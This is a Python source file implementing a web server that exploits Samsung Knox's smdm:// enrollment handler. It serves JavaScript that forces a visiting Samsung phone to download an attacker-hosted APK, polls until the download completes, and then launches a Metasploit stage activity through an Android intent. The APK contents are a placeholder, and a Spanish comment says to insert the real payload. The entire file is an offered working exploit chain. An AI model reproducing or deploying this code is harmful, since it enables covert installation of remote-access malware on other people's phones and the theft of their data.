import hashlib
import random
import string
import time

from http.server import BaseHTTPRequestHandler, HTTPServer

class SamsungKnoxExploitServer(BaseHTTPRequestHandler):
    served_payloads = {}

    def do_GET(self):
        if self.path.endswith('.apk/latest'):
            self.send_response(200)
            self.send_header('Content-Length', len(self.apk_bytes()))
            self.send_header('ETag', hashlib.md5(self.apk_bytes()).hexdigest())
            self.end_headers()
            self.wfile.write(self.apk_bytes())
            self.served_payloads[self.path.split('/')[-2]] = 1
        elif self.path.startswith('_poll'):
            payload_id = self.path.split('=')[-1]
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(str(self.served_payloads.get(payload_id, 0)).encode())
        elif self.path.endswith('launch'):
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(self.launch_html().encode())
        else:
            self.send_response(404)

    def apk_bytes(self):
        return b'MOCK APK BYTES'  # Aquí debes reemplazar esto con los bytes reales de tu APK

    def launch_html(self):
        return '''
            <!doctype html>
            <html>
            <head></head>
            <body>
                <script>
                    {exploit_js}
                </script>
            </body>
            </html>
        '''.format(exploit_js=self.exploit_js())

    def exploit_js(self):
        payload_id = self.rand_word()
        return '''
            function poll() {{
                var xhr = new XMLHttpRequest();
                xhr.open('GET', '_poll?id={payload_id}&d=' + Math.random() * 999999999999);
                xhr.onreadystatechange = function() {{
                    if (xhr.readyState == 4) {{
                        if (xhr.responseText == '1') {{
                            setTimeout(killEnrollment, 100);
                        }} else {{
                            setTimeout(poll, 1000);
                            setTimeout(enroll, 0);
                            setTimeout(enroll, 500);
                        }}
                    }}
                }};
                xhr.onerror = function() {{
                    setTimeout(poll, 1000);
                    setTimeout(enroll, 0);
                }};
                xhr.send();
            }}

            function enroll() {{
                var loc = window.location.href.replace(/[/.]$/g, '');
                top.location = 'smdm://{rand_word}?update_url=' +
                    encodeURIComponent(loc) + '/{payload_id}.apk';
            }}

            function killEnrollment() {{
                top.location = "intent://{rand_word}?program=" +
                    "{rand_word}/#Intent;scheme=smdm;launchFlags=268468256;end";
                setTimeout(launchApp, 300);
            }}

            function launchApp() {{
                top.location = 'intent:view#Intent;SEL;component=com.metasploit.stage/.MainActivity;end';
            }}

            enroll();
            setTimeout(poll, 600);
        '''.format(payload_id=payload_id, rand_word=self.rand_word())

    def rand_word(self):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(3, 12)))


def main():
    host = 'localhost'
    port = 8080

    server = HTTPServer((host, port), SamsungKnoxExploitServer)
    print(f'Server running on {host}:{port}')

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print('Shutting down the server...')
        server.server_close()

if __name__ == '__main__':
    main()
